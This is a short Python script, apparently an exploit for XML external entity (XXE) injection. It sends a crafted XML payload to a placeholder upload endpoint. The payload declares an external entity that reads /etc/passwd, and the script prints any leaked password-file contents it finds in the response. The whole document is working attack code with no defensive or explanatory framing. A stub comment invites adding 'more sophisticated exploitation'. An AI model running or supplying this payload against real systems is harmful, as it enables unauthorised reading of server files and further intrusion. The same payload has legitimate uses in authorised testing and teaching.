import requests

# Target URL for XML upload
TARGET_URL = 'http://vulnerable-website.com/upload_xml'

# XXE payload
XXE_PAYLOAD = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
'''

def upload_xml(url, xml_payload):
    # Send the XXE payload to the target URL
    response = requests.post(url, data={'xml': xml_payload}, headers={'Content-Type': 'application/xml'})
    return response

def check_xxe_vulnerability(url):
    response = upload_xml(url, XXE_PAYLOAD)
    # Check for sensitive data in response
    if "root:x:" in response.text or "bin:x:" in response.text:  # Example of Unix passwd file entries
        print("XXE vulnerability found. Sensitive data exposed:")
        print(response.text)
        return True
    return False

def perform_xxe_attack():
    # Verify if XXE vulnerability exists
    if check_xxe_vulnerability(TARGET_URL):
        print("XXE vulnerability confirmed. Exploiting...")
        # You can add more sophisticated exploitation here
        print("XXE attack executed.")
    else:
        print("No XXE vulnerability found.")

perform_xxe_attack()
